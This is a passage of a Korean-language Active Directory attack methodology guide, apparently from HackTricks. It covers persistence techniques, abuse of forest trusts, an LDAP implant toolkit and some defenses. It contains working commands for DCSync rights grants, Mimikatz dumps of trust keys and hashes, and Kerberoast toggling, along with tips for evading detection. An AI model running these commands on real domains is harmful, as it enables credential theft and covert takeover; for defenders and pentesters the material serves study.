**다른 사용자들이** **침해된** 머신에 **접속**하는 경우, 메모리에서 자격증명을 **수집**하거나 그들의 프로세스에 **beacons를 주입**하여 그들을 가장할 수 있습니다.\
대부분의 사용자는 RDP를 통해 시스템에 접근하므로, 서드파티 RDP 세션에 대해 수행할 수 있는 몇 가지 공격 방법은 다음과 같습니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 도메인 가입 컴퓨터의 **로컬 Administrator 비밀번호**를 관리하기 위한 시스템으로, 비밀번호를 **무작위화**, 고유화하고 자주 **변경**되도록 보장합니다. 이 비밀번호들은 Active Directory에 저장되며 접근은 ACL을 통해 권한이 부여된 사용자로 제한됩니다. 이러한 비밀번호에 접근할 수 있는 충분한 권한이 있다면, 다른 컴퓨터로 pivot하는 것이 가능합니다.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

침해된 머신에서 **certificates를 수집**하는 것은 환경 내에서 권한 상승을 일으킬 수 있는 방법입니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**취약한 templates**가 구성되어 있다면 이를 악용해 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

한번 **Domain Admin** 또는 더 나아가 **Enterprise Admin** 권한을 획득하면, 도메인 데이터베이스인 _ntds.dit_을 **덤프**할 수 있습니다.

[**DCSync 공격에 대한 더 많은 정보는 여기서 확인하세요**](dcsync.md).

[**NTDS.dit을 훔치는 방법에 대한 자세한 정보는 여기서 확인하세요**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

앞서 논의한 몇 가지 기법은 지속성(persistence)에도 사용될 수 있습니다.\
예를 들어 다음을 수행할 수 있습니다:

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하도록 만들기

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하도록 만들기

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**은 특정 서비스에 대한 **정상적인 Ticket Granting Service (TGS) 티켓**을 생성하기 위해 **NTLM hash**(예: PC account의 hash)를 사용하는 기법입니다. 이 방법은 해당 서비스 권한으로 접근하기 위해 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**은 공격자가 Active Directory 환경에서 **krbtgt 계정의 NTLM hash**에 접근하는 것을 포함합니다. 이 계정은 모든 **Ticket Granting Ticket (TGT)**을 서명하는 데 사용되므로 중요합니다.

공격자가 이 hash를 획득하면, 임의의 계정에 대한 **TGTs**를 생성할 수 있습니다 (Silver ticket attack과 유사한 원리).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이는 일반적인 golden ticket 탐지 메커니즘을 **우회하도록 위조된** golden ticket과 유사한 기법입니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

계정의 **certificates를 보유하거나 발급할 수 있는 능력**은 해당 사용자의 계정에 지속적으로 접근할 수 있는 매우 좋은 방법입니다(비밀번호를 변경해도 유효할 수 있음):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates를 사용하면 도메인 내에서 높은 권한으로 지속성을 유지**하는 것도 가능합니다:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** 객체는 **Domain Admins**와 **Enterprise Admins** 같은 특권 그룹의 보안을 유지하기 위해 표준 **ACL**을 적용하여 무단 변경을 방지합니다. 그러나 이 기능은 악용될 수 있습니다; 공격자가 AdminSDHolder의 ACL을 수정하여 일반 사용자에게 전체 접근 권한을 부여하면, 그 사용자는 모든 특권 그룹에 대한 광범위한 제어를 얻게 됩니다. 이 보안 메커니즘은 주의 깊게 모니터링되지 않으면 오히려 권한 남용을 초래할 수 있습니다.

[**AdminDSHolder Group에 대한 더 많은 정보는 여기에서 확인하세요.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller (DC)**에는 **로컬 관리자** 계정이 존재합니다. 해당 머신에서 관리자 권한을 획득하면, **mimikatz**를 사용해 로컬 Administrator hash를 추출할 수 있습니다. 그 다음 원격에서 이 비밀번호를 사용하려면 레지스트리 수정을 통해 **이 비밀번호 사용을 활성화**해야 합니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 도메인 객체에 대해 **특수 권한을 사용자에게 부여**하면, 그 사용자가 미래에 권한을 상승시킬 수 있도록 만들 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors**는 객체가 다른 객체에 대해 가진 **권한**을 **저장**하는 데 사용됩니다. 객체의 security descriptor에 **작은 변경**을 가할 수 있다면, 해당 객체에 대해 privileged group에 속하지 않고도 매우 흥미로운 권한을 획득할 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` 보조 클래스를 악용하여 `entryTTL`/`msDS-Entry-Time-To-Die`와 함께 단기간 존재하는 principals/GPOs/DNS 레코드를 생성하면, tombstone 없이 자기 삭제되어 LDAP 증거를 지우면서 orphan SIDs, 깨진 `gPLink` 참조, 또는 캐시된 DNS 응답을 남길 수 있습니다(예: AdminSDHolder ACE 오염 또는 악의적인 `gPCFileSysPath`/AD-integrated DNS 리다이렉트).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

메모리에서 **LSASS**를 변경하여 **범용 비밀번호(universal password)**를 설정하면 모든 도메인 계정에 접근할 수 있습니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자신만의 **SSP**를 만들어 머신 접근에 사용되는 **credentials를 평문으로 캡처**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

이 기법은 AD에 **새 Domain Controller를 등록**하고 이를 사용해 지정된 객체에 대해 SIDHistory, SPNs 등의 **속성들을 푸시**합니다. 이 과정에서 **수정에 관한 로그를 남기지 않습니다**. DA 권한이 필요하며 루트 도메인 내부에 있어야 합니다.\
단, 잘못된 데이터를 사용할 경우 보기 안 좋은 로그가 남을 수 있습니다.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 LAPS 비밀번호를 읽을 수 있는 충분한 권한이 있다면 권한 상승 방법에 대해 이야기했습니다. 그러나 이러한 비밀번호는 **지속성 유지**에도 사용될 수 있습니다.\
참조:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 보안 경계로 간주합니다. 이는 **단일 도메인의 침해가 전체 Forest의 침해로 이어질 수 있음을** 의미합니다.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 리소스에 접근할 수 있도록 하는 보안 메커니즘입니다. 이는 두 도메인 간의 인증 시스템을 연결하여 인증 검증이 원활하게 이루어지도록 합니다. 도메인 간 신뢰를 설정할 때, 각 도메인은 해당 신뢰의 무결성에 중요한 특정 **keys**를 자신의 **Domain Controllers (DCs)**에 교환하고 보관합니다.

일반적인 시나리오에서, 사용자가 **trusted domain**의 서비스를 이용하려면 우선 자신의 도메인 DC로부터 **inter-realm TGT**라는 특수한 티켓을 요청해야 합니다. 이 TGT는 두 도메인이 합의한 공유 **key**로 암호화됩니다. 사용자는 이 TGT를 **trusted domain의 DC**에 제시하여 서비스 티켓(**TGS**)을 받습니다. trusted domain의 DC가 inter-realm TGT를 공유된 trust key로 검증하면, 해당 서비스에 접근할 수 있는 TGS를 발급합니다.

**절차**:

1. **Domain 1**의 **client computer**가 자신의 **NTLM hash**를 사용해 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**을 요청합니다.
2. 클라이언트가 성공적으로 인증되면 DC1은 새로운 TGT를 발급합니다.
3. 클라이언트는 **Domain 2**의 리소스에 접근하기 위해 DC1에 **inter-realm TGT**를 요청합니다.
4. inter-realm TGT는 두 도메인 간의 양방향 도메인 신뢰의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 이 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**에 가져갑니다.
6. DC2는 공유된 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 클라이언트가 접근하려는 Domain 2 내 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로, 클라이언트는 이 TGS를 서버에 제시하고, 서버 계정 해시로 암호화된 TGS를 통해 Domain 2의 서비스에 접근합니다.

### Different trusts

신뢰는 **단방향(one way)**일 수도 있고 **양방향(two ways)**일 수도 있다는 점에 유의해야 합니다. 양방향 옵션에서는 두 도메인이 서로를 신뢰하지만, **단방향** 신뢰 관계에서는 한 도메인이 **trusted**이고 다른 도메인이 **trusting** 도메인이 됩니다. 이 경우 **trusted 도메인에서는 trusting 도메인 내의 리소스에만 접근할 수 있습니다**.

만약 Domain A가 Domain B를 신뢰한다면, A는 trusting 도메인이고 B는 trusted 도메인입니다. 또한 **Domain A**에서는 이것이 **Outbound trust**로 보이고; **Domain B**에서는 **Inbound trust**로 보입니다.

**Different trusting relationships**

- **Parent-Child Trusts**: 동일한 포리스트 내에서 흔한 구성으로, child 도메인은 자동으로 parent 도메인과 양방향 전이적(transtive) 신뢰를 갖습니다. 이는 parent와 child 간에 인증 요청이 원활히 흐를 수 있음을 의미합니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, child 도메인들 간에 설정되어 referral 과정을 단축합니다. 복잡한 포리스트에서는 인증 referral이 포리스트 루트까지 올라갔다가 대상 도메인으로 내려가야 하는데, cross-links를 만들면 이 경로를 단축할 수 있습니다.
- **External Trusts**: 서로 관련이 없는 다른 도메인 사이에 설정되는 비전이전(non-transitive) 신뢰입니다. [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면, external trusts는 포리스트 신뢰로 연결되어 있지 않은 외부 도메인의 리소스에 접근할 때 유용합니다. 보안은 external trusts에서 SID filtering으로 강화됩니다.
- **Tree-root Trusts**: 포리스트 루트 도메인과 새로 추가된 tree root 간에 자동으로 설정되는 신뢰입니다. 자주 접하지는 않지만, 새로운 도메인 트리를 포리스트에 추가할 때 중요하며 두 방향 전이성을 제공합니다. 자세한 내용은 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)를 참조하세요.
- **Forest Trusts**: 두 포리스트 루트 도메인 간의 양방향 전이적 신뢰로, SID filtering을 통해 보안이 강화됩니다.
- **MIT Trusts**: 비-Windows이면서 [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos 도메인과 설정되는 신뢰입니다. MIT trusts는 Windows 생태계 밖의 Kerberos 기반 시스템과 통합해야 하는 환경에 적합합니다.

#### Other differences in **trusting relationships**

- 신뢰 관계는 **전이적(transitive)**일 수도 있고 **비전이적(non-transitive)**일 수도 있습니다 (예: A가 B를 신뢰하고 B가 C를 신뢰하면 A는 C를 신뢰한다).
- 신뢰 관계는 **bidirectional trust**(상호 신뢰)로 설정될 수도 있고 **one-way trust**(단방향 신뢰)로 설정될 수도 있습니다.

### Attack Path

1. 신뢰 관계를 **열거(enumerate)**
2. 어떤 **security principal**(user/group/computer)이 **다른 도메인의 리소스에 접근할 수 있는지**(ACE 항목이나 다른 도메인의 그룹 멤버십 등을 통해) 확인하세요. **도메인 간 관계**를 찾아보세요(신뢰가 아마도 이를 위해 생성되었을 수 있음).
1. 이 경우 **kerberoast**가 또 다른 옵션이 될 수 있습니다.
3. 도메인 간으로 **pivot**할 수 있는 **accounts**를 **compromise**하세요.

다른 도메인의 리소스에 접근할 수 있는 공격자들은 주로 세 가지 메커니즘을 통해 접근할 수 있습니다:

- **Local Group Membership**: 프린터나 서버의 “Administrators” 같은 로컬 그룹에 principals가 추가될 수 있으며, 이는 해당 머신에 대한 상당한 제어 권한을 부여합니다.
- **Foreign Domain Group Membership**: principals가 외부 도메인의 그룹의 멤버가 될 수도 있습니다. 다만 이 방법의 효율성은 신뢰의 성격과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: principals가 ACL, 특히 DACL 내의 ACE 항목으로 지정되어 특정 리소스에 접근할 수 있게 될 수 있습니다. ACLs, DACLs, ACEs의 메커니즘을 더 깊이 이해하려면 "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" 백서가 매우 유용합니다.

### Find external users/groups with permissions

외부 보안 주체를 찾으려면 도메인에서 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**를 확인할 수 있습니다. 여기에는 **외부 도메인/forest**의 사용자/그룹이 포함됩니다.

이를 **Bloodhound**에서 확인하거나 powerview를 사용하여 확인할 수 있습니다:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 트러스트를 열거하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> 현재 도메인에서 사용되는 키는 다음 명령으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

트러스트를 악용해 SID-History injection으로 child/parent 도메인에 대해 Enterprise admin으로 권한 상승:

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)을 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 포리스트 전체의 구성 데이터를 저장하는 중앙 저장소 역할을 합니다. 이 데이터는 포리스트 내의 모든 Domain Controller (DC)로 복제되며, 쓰기 가능한 DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 가능한 경우 child DC에서, DC에 대한 **SYSTEM 권한**이 필요합니다.

**Link GPO to root DC site**

Configuration NC의 Sites 컨테이너는 AD 포리스트 내의 도메인 가입 컴퓨터들의 모든 사이트 정보를 포함합니다. 어떤 DC에서든 SYSTEM 권한으로 작동하면 공격자는 GPO를 root DC 사이트에 연결할 수 있습니다. 이 작업은 해당 사이트에 적용되는 정책을 조작함으로써 루트 도메인을 잠재적으로 손상시킬 수 있습니다.

자세한 정보는 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)을 참고하세요.

**Compromise any gMSA in the forest**

공격 벡터 중 하나는 도메인 내 권한 있는 gMSA를 표적으로 삼는 것입니다. gMSA의 비밀번호를 계산하는 데 필요한 KDS Root key는 Configuration NC에 저장됩니다. 어떤 DC에서든 SYSTEM 권한을 얻으면 KDS Root key에 접근해 포리스트 내의 모든 gMSA 비밀번호를 계산할 수 있습니다.

자세한 분석 및 단계별 안내는 다음을 참고하세요:

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 delegated MSA 공격 (BadSuccessor – abusing migration attributes):

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 새로운 권한 있는 AD 객체가 생성되기를 기다리는 인내가 필요합니다. SYSTEM 권한을 가진 공격자는 AD Schema를 수정하여 어떤 사용자에게든 모든 클래스에 대한 완전한 제어권을 부여할 수 있습니다. 이는 새로 생성되는 AD 객체에 대한 무단 접근 및 제어로 이어질 수 있습니다.

추가 읽을거리는 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)에서 확인할 수 있습니다.

**From DA to EA with ADCS ESC5**

ADCS ESC5 취약점은 PKI 객체에 대한 제어를 목표로 하여 포리스트 내의 임의 사용자로 인증할 수 있는 인증서 템플릿을 생성할 수 있게 합니다. PKI 객체가 Configuration NC에 존재하므로 쓰기 가능한 child DC를 침해하면 ESC5 공격을 수행할 수 있습니다.

이와 관련한 자세한 내용은 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)를 참조하세요. ADCS가 없는 환경에서는 공격자가 필요한 구성 요소를 설정할 수 있는 능력이 있으며, 이에 대한 논의는 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)에서 확인할 수 있습니다.

### 외부 포리스트 도메인 - 일방향(인바운드) 또는 양방향
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서는 **귀하의 도메인이 외부 도메인에 의해 신뢰되어** 외부 도메인에 대해 **불명확한 권한**을 부여받습니다. 귀하의 도메인 주체들(principals)이 외부 도메인에 대해 어떤 접근 권한을 갖고 있는지 찾아낸 다음 이를 악용하려고 시도해야 합니다:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포레스트 도메인 - 단방향(아웃바운드)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this 시나리오에서 **your domain**은 **different domains**의 principal에게 일부 **privileges**를 **trusting** 하고 있습니다.

하지만, 한 **domain is trusted** 가 trusting 도메인에 의해 설정되면, trusted 도메인은 **predictable name**을 가진 **user**를 생성하고 그 **password**로 **trusted password**를 사용합니다. 즉, trusting 도메인의 **user**에 접근하여 trusted 도메인 내부로 들어가 이를 열람하고 권한 상승을 시도할 수 있습니다:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted 도메인을 침해하는 또 다른 방법은 domain trust의 **반대 방향**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 흔하지 않습니다).

trusted 도메인을 침해하는 또 다른 방법은 **user from the trusted domain can access** 하여 **RDP**로 로그인할 수 있는 머신에서 기다리는 것입니다. 그런 다음 공격자는 RDP 세션 프로세스에 코드를 주입하여 그곳에서 **access the origin domain of the victim** 할 수 있습니다.  
또한, 만약 **victim mounted his hard drive** 했다면, 공격자는 **RDP session** 프로세스에서 하드 드라이브의 **startup folder of the hard drive**에 **backdoors**를 저장할 수 있습니다. 이 기법은 **RDPInception.**이라고 불립니다.

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID Filtering은 포리스트 간 트러스트(inter-forest trusts)에서 SID history 속성을 이용한 공격 위험을 완화하며, 모든 inter-forest trusts에서 기본적으로 활성화되어 있습니다. 이는 Microsoft의 관점처럼 보안 경계를 도메인이 아닌 포리스트로 간주한다는 전제에 기반합니다.
- 다만 주의할 점은 SID Filtering이 일부 애플리케이션과 사용자 접근을 방해할 수 있어 가끔 비활성화되는 경우가 있다는 것입니다.

### **Selective Authentication:**

- 포리스트 간 트러스트의 경우 Selective Authentication을 사용하면 두 포리스트의 사용자가 자동으로 인증되지 않도록 하며, 대신 trusting 도메인 또는 포리스트 내의 도메인/서버에 접근하려면 명시적인 권한이 필요합니다.
- 이 조치들이 writable Configuration Naming Context (NC)의 악용이나 trust 계정에 대한 공격으로부터 보호하지는 못한다는 점을 유의해야 합니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 는 bloodyAD-style LDAP primitives를 x64 Beacon Object Files로 재구현하여 on-host implant(예: Adaptix C2) 내부에서 완전히 실행됩니다. 운영자는 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 패키지를 컴파일하고, `ldap.axs`를 로드한 다음 beacon에서 `ldap <subcommand>`를 호출합니다. 모든 트래픽은 현재 로그인 보안 컨텍스트로 LDAP(389)(signing/sealing) 또는 LDAPS(636)(auto certificate trust)를 통해 전달되므로 socks 프록시나 디스크 아티팩트가 필요 없습니다.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers`는 짧은 이름/OU 경로를 전체 DN으로 해석하고 해당 객체를 덤프합니다.
- `get-object`, `get-attribute`, and `get-domaininfo`는 임의의 속성(보안 설명자 포함)과 `rootDSE`의 포리스트/도메인 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd`는 로스팅 후보, delegation 설정, 그리고 LDAP에서 직접 기존의 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 설명자를 노출합니다.
- `get-acl` and `get-writable --detailed`는 DACL을 파싱하여 trustee, 권한(GenericAll/WriteDACL/WriteOwner/attribute writes) 및 상속 정보를 나열하여 즉시 ACL 권한 상승 대상들을 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 쓰기 프리미티브(권한 상승 및 지속성)

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`)는 운영자가 OU 권한이 있는 위치에 새로운 프린시펄 또는 머신 계정을 배치할 수 있게 합니다. `add-groupmember`, `set-password`, `add-attribute`, 그리고 `set-attribute`는 write-property 권한을 획득하면 대상 계정을 직접 탈취합니다.
- ACL 중심 명령어들(`add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`)은 AD 객체의 WriteDACL/WriteOwner를 암호 재설정, 그룹 멤버십 제어, 또는 DCSync 복제 권한으로 변환하며 PowerShell/ADSI 흔적을 남기지 않습니다. `remove-*` 계열 명령어들은 주입된 ACE를 정리합니다.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn`은 손상된 사용자를 즉시 Kerberoastable 상태로 만들고; `add-asreproastable`(UAC 토글)는 비밀번호를 건드리지 않고 AS-REP roasting 대상자로 표시합니다.
- Delegation 매크로들(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)은 beacon에서 `msDS-AllowedToDelegateTo`, UAC 플래그, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 재작성하여 constrained/unconstrained/RBCD 공격 경로를 열고 원격 PowerShell이나 RSAT가 필요 없게 만듭니다.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory`는 제어되는 프린시펄의 SID history에 권한 있는 SID를 주입합니다 (참조: [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS만으로 은밀한 권한 상속을 제공합니다.
- `move-object`는 컴퓨터나 사용자의 DN/OU를 변경하여 공격자가 `set-password`, `add-groupmember`, 또는 `add-spn`을 남용하기 전에 자산을 이미 위임 권한이 있는 OU로 끌어올 수 있게 합니다.
- 범위가 좁게 설계된 제거 명령들(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 등)은 운영자가 자격증명이나 영구 접근을 수집한 후 빠르게 롤백할 수 있어 탐지 흔적을 최소화합니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins는 다른 호스트에서 사용하는 것을 피하고 오직 Domain Controllers에만 로그인하도록 제한하는 것이 권장됩니다.
- **Service Account Privileges**: 서비스는 보안 유지를 위해 Domain Admin(DA) 권한으로 실행되어서는 안 됩니다.
- **Temporal Privilege Limitation**: DA 권한이 필요한 작업의 경우 그 지속 시간을 제한해야 합니다. 예시: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075를 감사한 후 DC/클라이언트에서 LDAP signing과 LDAPS channel binding을 적용하여 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Deception 구현은 함정 설정을 포함합니다. 예: 만료되지 않는 비밀번호 또는 Trusted for Delegation로 표시된 유인 사용자나 컴퓨터 생성. 구체적 방법으로 특정 권한을 가진 사용자 생성이나 고권한 그룹에 추가하는 방식이 있습니다.
- 실용적인 예: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception 기법 배포에 대해서는 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)를 참조하세요.

### **Identifying Deception**

- **For User Objects**: 의심스러운 징후로는 비정상적인 ObjectSID, 드문 로그인, 생성 날짜, 낮은 잘못된 비밀번호 시도 횟수 등이 있습니다.
- **General Indicators**: 유인 객체의 속성을 정상 객체와 비교하면 불일치를 발견할 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 같은 도구가 식별에 도움을 줍니다.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 탐지를 피하기 위해 Domain Controllers에서 세션 열거를 피합니다.
- **Ticket Impersonation**: 티켓 생성에 **aes** 키를 사용하면 NTLM으로 강등되지 않아 탐지를 회피하는 데 도움이 됩니다.
- **DCSync Attacks**: ATA 탐지를 피하려면 비-Domain Controller에서 실행하는 것이 권장됩니다. Domain Controller에서 직접 실행하면 경보가 발생합니다.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
